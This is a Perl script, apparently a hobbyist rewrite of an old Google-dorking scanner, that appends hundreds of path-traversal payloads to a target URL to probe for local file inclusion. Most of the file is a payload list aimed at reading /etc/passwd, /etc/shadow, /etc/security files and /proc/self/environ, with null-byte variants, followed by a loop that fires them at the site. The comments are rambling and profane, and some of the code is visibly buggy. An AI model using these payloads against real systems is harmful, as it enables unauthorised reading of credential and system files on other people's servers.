# rewrite of => Google Ajax scraper
# Developer  => ArkAngeL43
# 
#
#What does this script do:
#       Since this is a rewrite im going to use the standard usage of this script
#       however i could not properly well understand even by really reading the code 
#       what you are supposed to do with it, the best i could get is that it is a 
#       Google dorking utility tool that uses the google and LWP API to scrape google
#       and scan URL's for possible vulnerabilities, and also uses search terms? the 
#       entire thing was very very confusing and i just couldnt understand it, this rewrite
#       is an updated version of the script with more orgamized code, code optimization, newer
#       code standards to fit the newer version of perl, better output, a more information built
#       output, and IDS triping detection systems, this rewrite will basically go through a list 
#       of URL's, parse them into a @ ( Array ) run through them and scan them all for LFI, SQLI
#       and LFI enviroment vulnerabilities, here was an example output of the tool
#Any::Moose is deprecated. Please use Moo instead at /usr/local/share/perl/5.32.1/Google/Search.pm line 11.
#+=====================================================================+
#|                              GScrape                                |
#|         ________  _________                                         |
#|        /  _____/ /   _____/ ________________  ______   ____         |
#|       /   \  ___ \_____  \_/ ___\_  __ \__  \ \____ \_/ __ \        |
#|       \    \_\  \/        \  \___|  | \// __ \|  |_> >  ___/        |
#|        \______  /_______  /\___  >__|  (____  /   __/ \___  >       |
#|               \/        \/     \/           \/|__|        \/        |
#|                                                                     |
#|                                                                     |
#|           Uses Google AJAX API to search for vulnerabilities        |
#+=====================================================================+
#Undefined subroutine &main::printInfo called at dork.pl line 33.
#
# few rthings to point out, there was an undefined function, and any::moos is deprecated 
#
# even when the tool did work cause sometimes it would execute the functions but not 
#
# output if the tests came back true or false or what was going on, if the URL was 
#
# made vulnerable on purp;ose as i tested it would come back false 
#
# as of today im going to take it upon myself and fix this myself, given it wasnt 
#
# posted on github and posted on some old forum from the early 2000's and the author 
#
# went under some excure name i wont be able to properly credit them other than this 
#
# og author => _T5he_V4000ean 
#
# which sint evem a username on the forum anymore and let alone isnt even a github account 
#
# i tried my best to credit but i really cant XD, dint bother me about it stop looking at this 
#
# and do you effing job, look at the fucking code and assume it works LOLZ
#
# if you dont understand this leave now 
#
# Script_mark - dev_c_91 -> A:J:G
# Script_yp   - dev_c_90 -> C:I:L
# Script_fun  - dev_c_sub81 -> C:B:2
use strict;
use warnings;
use Getopt::Std;
use HTTP::Request;
#use Google::Search;
# limit the use of google search, i dont feel this is needed
use LWP::UserAgent;
use LWP::Simple;
# use say for better out 
use feature 'say';
#
use HTTP::Tiny;

# start main script of by declaring public visibile variables 
my $banner = "bnn.txt";
# useragent and google settings 

# i got sick of using argv as a os command thingy magig
my %opts = (            
);

getopt('d:o:u:', \%opts);

# declare opts
my $dork = $opts{d};
my $resultfile = $opts{o};
my $url = $opts{u};



# declare settings for AJAX_SPIDER_MAIN
my $max = 1;

# declare settings for mkdir 
my $dir = "web-collection";
my $file_a = $dir . "/url.map";
# using the . to .join subs
################## DECALRE VULNERABILITIES POSSIBLE OR HAVE IN STORAGE FOR LFI######################
my @lfitest = (
    '/etc/passwd%00',
	'/etc/passwd',
	'/proc/self/environ%00',
	'/proc/self/environ',
	'../../../../../../../../../../../../../../../proc/self/environ',
	'../../../../../../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../../../../../etc/passwd%00',
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '../../../../../../../etc/passwd',
    '../../../../../../../../etc/passwd',
    '../../../../../../../../../etc/passwd',
    '../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../../../../../../etc/passwd',
    '....//etc/passwd',
    '....//....//etc/passwd',
    '....//....//....//etc/passwd',
    '....//....//....//....//etc/passwd',
    '....//....//....//....//....//etc/passwd',
    '....//....//....//....//....//....//etc/passwd',
    '....//....//....//....//....//....//....//etc/passwd',
    '....//....//....//....//....//....//....//....//etc/passwd',
    '....//....//....//....//....//....//....//....//....//etc/passwd',
    '....//....//....//....//....//....//....//....//....//....//etc/passwd',
    '../../etc/passwd%00',
    '../../../etc/passwd%00',
    '../../../../etc/passwd%00',
    '../../../../../etc/passwd%00',
    '../../../../../../etc/passwd%00',
    '../../../../../../../etc/passwd%00',
    '../../../../../../../../etc/passwd%00',
    '../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../../../../../../../etc/passwd%00',
    '....//etc/passwd%00',
    '....//....//etc/passwd%00',
    '....//....//....//etc/passwd%00',
    '....//....//....//....//etc/passwd%00',
    '....//....//....//....//....//etc/passwd%00',
    '....//....//....//....//....//....//etc/passwd%00',
    '....//....//....//....//....//....//....//etc/passwd%00',
    '....//....//....//....//....//....//....//....//etc/passwd%00',
    '....//....//....//....//....//....//....//....//....//etc/passwd%00',
    '....//....//....//....//....//....//....//....//....//....//etc/passwd%00',
    '../etc/shadow',
    '../../etc/shadow',
    '../../../etc/shadow',
    '../../../../etc/shadow',
    '../../../../../etc/shadow',
    '../../../../../../etc/shadow',
    '../../../../../../../etc/shadow',
    '../../../../../../../../etc/shadow',
    '../../../../../../../../../etc/shadow',
    '../../../../../../../../../../etc/shadow',
    '../../../../../../../../../../../etc/shadow',
    '../../../../../../../../../../../../etc/shadow',
    '../../../../../../../../../../../../../etc/shadow',
    '../../../../../../../../../../../../../../etc/shadow',
    '../etc/shadow%00',
    '../../etc/shadow%00',
    '../../../etc/shadow%00',
    '../../../../etc/shadow%00',
    '../../../../../etc/shadow%00',
    '../../../../../../etc/shadow%00',
    '../../../../../../../etc/shadow%00',
    '../../../../../../../../etc/shadow%00',
    '../../../../../../../../../etc/shadow%00',
    '../../../../../../../../../../etc/shadow%00',
    '../../../../../../../../../../../etc/shadow%00',
    '../../../../../../../../../../../../etc/shadow%00',
    '../../../../../../../../../../../../../etc/shadow%00',
    '../../../../../../../../../../../../../../etc/shadow%00',
    '../etc/group',
    '../../etc/group',
    '../../../etc/group',
    '../../../../etc/group',
    '../../../../../etc/group',
    '../../../../../../etc/group',
    '../../../../../../../etc/group',
    '../../../../../../../../etc/group',
    '../../../../../../../../../etc/group',
    '../../../../../../../../../../etc/group',
    '../../../../../../../../../../../etc/group',
    '../../../../../../../../../../../../etc/group',
    '../../../../../../../../../../../../../etc/group',
    '../../../../../../../../../../../../../../etc/group',
    '../etc/group%00',
    '../../etc/group%00',
    '../../../etc/group%00',
    '../../../../etc/group%00',
    '../../../../../etc/group%00',
    '../../../../../../etc/group%00',
    '../../../../../../../etc/group%00',
    '../../../../../../../../etc/group%00',
    '../../../../../../../../../etc/group%00',
    '../../../../../../../../../../etc/group%00',
    '../../../../../../../../../../../etc/group%00',
    '../../../../../../../../../../../../etc/group%00',
    '../../../../../../../../../../../../../etc/group%00',
    '../../../../../../../../../../../../../../etc/group%00',
    '../etc/security/group',
    '../../etc/security/group',
    '../../../etc/security/group',
    '../../../../etc/security/group',
    '../../../../../etc/security/group',
    '../../../../../../etc/security/group',
    '../../../../../../../etc/security/group',
    '../../../../../../../../etc/security/group',
    '../../../../../../../../../etc/security/group',
    '../../../../../../../../../../etc/security/group',
    '../../../../../../../../../../../etc/security/group',
    '../etc/security/group%00',
    '../../etc/security/group%00',
    '../../../etc/security/group%00',
    '../../../../etc/security/group%00',
    '../../../../../etc/security/group%00',
    '../../../../../../etc/security/group%00',
    '../../../../../../../etc/security/group%00',
    '../../../../../../../../etc/security/group%00',
    '../../../../../../../../../etc/security/group%00',
    '../../../../../../../../../../etc/security/group%00',
    '../../../../../../../../../../../etc/security/group%00',
    '../etc/security/passwd',
    '../../etc/security/passwd',
    '../../../etc/security/passwd',
    '../../../../etc/security/passwd',
    '../../../../../etc/security/passwd',
    '../../../../../../etc/security/passwd',
    '../../../../../../../etc/security/passwd',
    '../../../../../../../../etc/security/passwd',
    '../../../../../../../../../etc/security/passwd',
    '../../../../../../../../../../etc/security/passwd',
    '../../../../../../../../../../../etc/security/passwd',
    '../../../../../../../../../../../../etc/security/passwd',
    '../../../../../../../../../../../../../etc/security/passwd',
    '../../../../../../../../../../../../../../etc/security/passwd',
    '../etc/security/passwd%00',
    '../../etc/security/passwd%00',
    '../../../etc/security/passwd%00',
    '../../../../etc/security/passwd%00',
    '../../../../../etc/security/passwd%00',
    '../../../../../../etc/security/passwd%00',
    '../../../../../../../etc/security/passwd%00',
    '../../../../../../../../etc/security/passwd%00',
    '../../../../../../../../../etc/security/passwd%00',
    '../../../../../../../../../../etc/security/passwd%00',
    '../../../../../../../../../../../etc/security/passwd%00',
    '../../../../../../../../../../../../etc/security/passwd%00',
    '../../../../../../../../../../../../../etc/security/passwd%00',
    '../../../../../../../../../../../../../../etc/security/passwd%00',
    '../etc/security/user',
    '../../etc/security/user',
    '../../../etc/security/user',
    '../../../../etc/security/user',
    '../../../../../etc/security/user',
    '../../../../../../etc/security/user',
    '../../../../../../../etc/security/user',
    '../../../../../../../../etc/security/user',
    '../../../../../../../../../etc/security/user',
    '../../../../../../../../../../etc/security/user',
    '../../../../../../../../../../../etc/security/user',
    '../../../../../../../../../../../../etc/security/user',
    '../../../../../../../../../../../../../etc/security/user',
    '../etc/security/user%00',
    '../../etc/security/user%00',
    '../../../etc/security/user%00',
    '../../../../etc/security/user%00',
    '../../../../../etc/security/user%00',
    '../../../../../../etc/security/user%00',
    '../../../../../../../etc/security/user%00',
    '../../../../../../../../etc/security/user%00',
    '../../../../../../../../../etc/security/user%00',
    '../../../../../../../../../../etc/security/user%00',
    '../../../../../../../../../../../etc/security/user%00',
    '../../../../../../../../../../../../etc/security/user%00',
    '../../../../../../../../../../../../../etc/security/user%00'
);

# enviroment scanning
my @enviroment_ = ('
    ../proc/self/environ',
    '../../proc/self/environ',
    '../../../proc/self/environ',
    '../../../../proc/self/environ',
    '../../../../../proc/self/environ',
    '../../../../../../proc/self/environ',
    '../../../../../../../proc/self/environ',
    '../../../../../../../../proc/self/environ',
    '../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../../../../../proc/self/environ',
    '../proc/self/environ%00',
    '../../proc/self/environ%00',
    '../../../proc/self/environ%00',
    '../../../../proc/self/environ%00',
    '../../../../../proc/self/environ%00',
    '../../../../../../proc/self/environ%00',
    '../../../../../../../proc/self/environ%00',
    '../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../../../../proc/self/environ%00'

);
 



# this will parse each list of env and LFI searching vulnerabilities 
# and go based off of the inital request repsonse, if the response has sonething 
# like hacked, hacking, attack, etc etc or `blocked` output 
#
# watchdog pausing....Triggered an IDS on url -> $url
sub test_and_find() {
    for my $file_inc_test(@lfitest) {
        my $Client = HTTP::Tiny->new();
        my $final_target = $url . $file_inc_test;
        my $response = $Client->get($final_target);
        if($final_target, $response->{status} == '200') {
            say "\n[+] URL -> $final_target | Came back true for LOCAL FILE INCLUSION VULNERABILITIES DURING TESTING OF => $file_inc_test\n\n";
            exit();
        } else {
            my $cur_stat = $response->{status};
            say "\n\033[31m[!] TESTING -> $final_target \033[36m GOT CODE -> $cur_stat";
        }
    }
}



# ascii banner
sub banner() {
    print "\x1b[H\x1b[2J\x1b[3J";
    open(F, '<', "banner.txt") or die $!;
    while (<F>) {
        print "\033[31m", $_;
    }
    close(F);
}

sub main() {
    banner();
    test_and_find();
}



main();